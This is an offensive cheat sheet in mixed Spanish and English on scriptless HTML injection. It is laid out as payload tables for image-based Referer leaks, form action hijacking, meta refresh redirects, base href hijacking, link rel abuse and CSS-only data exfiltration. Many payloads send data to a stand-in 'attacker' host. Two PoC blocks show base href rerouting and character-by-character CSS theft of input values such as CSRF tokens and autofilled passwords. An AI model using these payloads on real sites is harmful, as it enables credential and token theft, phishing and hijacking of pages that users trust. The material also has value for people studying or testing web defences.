---
aliases:
  - No-JS HTML Injection
  - Scriptless XSS
  - CSS Injection
  - Base href Hijack
tags:
  - type/cheatsheet
  - vuln/html-injection
  - technique/exfiltration
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTML Injection]]'
---
# HTML Injection - Inyección Sin Script

***

## Image `src` Exfil (Referer Leak)

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| `<img src="https://attacker/log">` | Browser fetches URL → Referer header reveals current page URL | Standard. |
| `<img src="//attacker/log">` | Protocol-relative — same | Same. |
| `<img src="https://attacker/?d=...">` | Encode data in URL via app-side concat | Stored data leak. |
| `<img src="https://attacker/" lazy="loading">` | Lazy-loaded image | Stealth. |
| Background image CSS | `<div style="background:url(https://attacker/log)"></div>` | Same effect. |
| Multiple images en bulk | Hundreds of img tags → DDoS analytics | Heavy. |
| Combine con sensitive URL | Sensitive token in URL → Referer leaks to atacante | Common. |
| GIF poll | `<img src="//attacker/gif" />` con response polling | Persistent. |
| Conditional GIF (CSS) | `:hover` triggers image load only on user hover | Tracking. |
| Email tracking pixel | Same vector en HTML email | Standard email tracking. |
^htmli-noscript-image

___

## Form Action Redirect

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| Form action external | `<form action="https://attacker/log">` overrides ANY parent form | Form override. |
| Auto-submit no script | `<form action="..."><input type="submit"></form>` requires user click | Manual. |
| Hidden inputs en visible form | Insert `<input type="hidden" name="malicious" value="x">` in legit form context | Form pollution. |
| Append form action | If reflected ANTES de existing form's `<form>` tag, atacante's form wins | Order matters. |
| Replace existing form action | Inject CSS/HTML to override visual form | Stealth. |
| Form button label override | `<input type="submit" value="LOGIN">` con malicious action | Standard phishing. |
| ImageButton form | `<input type="image" src="legit.png" formaction="//attacker">` | Image-disguised submit. |
| Multipart form | Force file upload to attacker | If file fields present. |
| Form `target` | `<form target="_blank" action="...">` opens new tab | UX-aware phish. |
^htmli-noscript-form

___

## Meta Refresh

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| Auto-redirect | `<meta http-equiv="refresh" content="0;url=https://attacker">` | Page reloads to attacker. |
| Delayed redirect | `<meta http-equiv="refresh" content="5;url=...">` | 5 sec delay. |
| Conditional refresh con cookie | `content="X;url=//attacker?c=document.cookie"` | NO funciona — meta refresh no JS. |
| Refresh con DataURI | `content="0;url=data:text/html,<script>...</script>"` | Data URL — but blocked en modern browsers. |
| Refresh con `javascript:` | `content="0;url=javascript:alert(1)"` | Blocked en modern browsers. |
| Combine con location | If `<head>` controlled, multiple refresh layers | Edge. |
| Refresh in body (most browsers ignore) | Some still respect | Edge. |
| Loop refresh | `content="1;url=current_page"` con same URL | DoS / persistent. |
| Refresh with fragment | `url=https://target.com#malicious` | Anchor manipulation. |
^htmli-noscript-meta

___

## `<base href>` Hijacking

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| Inject base href | `<base href="https://attacker.com/">` | All relative URLs en page rerouted. |
| All `<img src="legit.png">` | Now load from `https://attacker.com/legit.png` | Asset hijacking. |
| All `<a href="page2">` | Now point to `https://attacker.com/page2` | Link hijacking. |
| Form action relative | `<form action="/api/transfer">` posts to attacker | CSRF via base href. |
| Link rel canonical | If atacante's domain becomes canonical, SEO impact | SEO trick. |
| CSS / JS rerouting | `<link rel="stylesheet" href="style.css">` loads attacker's CSS | Style poisoning. |
| Subresource integrity ignore | Some apps don't enforce SRI | Combined attack. |
| Image-only base | Browsers respect first `<base>` only | Position matters. |
| Combined con existing legit base | Atacante's base placed before original | Order trick. |
| Base URL with subpath | `<base href="https://attacker.com/legit/">` | Mimics legit path. |
^htmli-noscript-base

### PoC base href hijack

```html
<!-- Legit page renders this in body después de input reflejado -->
<base href="https://attacker.com/">

<!-- Now original page contiene: -->
<img src="logo.png">           ← carga de attacker.com/logo.png
<a href="/admin">Admin</a>     ← apunta a attacker.com/admin
<form action="/api/transfer">  ← submits to attacker
<link rel="stylesheet" href="theme.css">  ← loads attacker's CSS
```

___

## `<link rel>` Manipulation

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| `<link rel="stylesheet" href="https://attacker/style.css">` | Loads attacker's CSS | Style override. |
| `<link rel="canonical" href="https://attacker">` | SEO canonical hijack | Search engine impact. |
| `<link rel="dns-prefetch" href="//attacker">` | DNS prefetch | Recon. |
| `<link rel="preconnect" href="//attacker">` | TCP+TLS preconnect | Same. |
| `<link rel="preload" href="..." as="...">` | Force resource load | Bandwidth abuse. |
| `<link rel="prefetch" href="...">` | Prefetch document | Cache poisoning. |
| `<link rel="prerender" href="...">` (deprecated) | Render off-screen | Privacy. |
| `<link rel="manifest" href="...">` | PWA manifest | Mobile-specific. |
| `<link rel="alternate" hreflang="en" href="...">` | Alt language redirect | i18n abuse. |
| `<link rel="amphtml" href="...">` | AMP version pointer | Google AMP abuse. |
| `<link rel="icon" href="//attacker/favicon">` | Custom favicon | Brand spoofing. |
^htmli-noscript-linkrel

___

## CSS-Only Attacks (Cross-Site Styles)

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| External CSS injection | `<link rel="stylesheet" href="https://attacker">` | Atacante controls all styling. |
| Inline style | `<div style="background:url(//attacker/log)">` | Single element style. |
| Style tag | `<style>body { background: url(//attacker); }</style>` | Page-wide style. |
| CSS exfil via `attribute selectors` | `input[value^="a"] { background: url(//attacker/?c=a); }` | Char-by-char data exfil. |
| Conditional CSS | `:hover`, `:focus`, `:checked` triggers | UX-conditional exfil. |
| CSS-only keyloggers | Combination of attribute selectors + image | Limited to first char usually. |
| CSP bypass | CSS doesn't trigger script-src | Bypass CSP often. |
| CSS injection en attribute | `style="...; background:url(//attacker);..."` | Attribute context. |
| CSS variables abuse | Override `--theme-color` with malicious | Modern. |
| Animation timing exfil | CSS animation triggers external load | Timing-based. |
| Print stylesheet abuse | `@media print { ... }` | Print-only attack. |
| Combined con HTML form | CSS positions fake form | Phishing prep. |
^htmli-noscript-css

### CSS exfil via attribute selectors PoC

```html
<style>
  input[value^="a"] { background: url(//attacker/?c=a); }
  input[value^="b"] { background: url(//attacker/?c=b); }
  ... (continue for all chars)
  input[value^="z"] { background: url(//attacker/?c=z); }
</style>

<!-- Si app render: <input value="USER_DATA">
     CSS evalúa primer char y triggers correspondiente background URL
     Browser fetches → atacante recibe primer char of value -->
```

Char-by-char exfiltration of input values (CSRF token, password de browser autofill) sin JS.

***
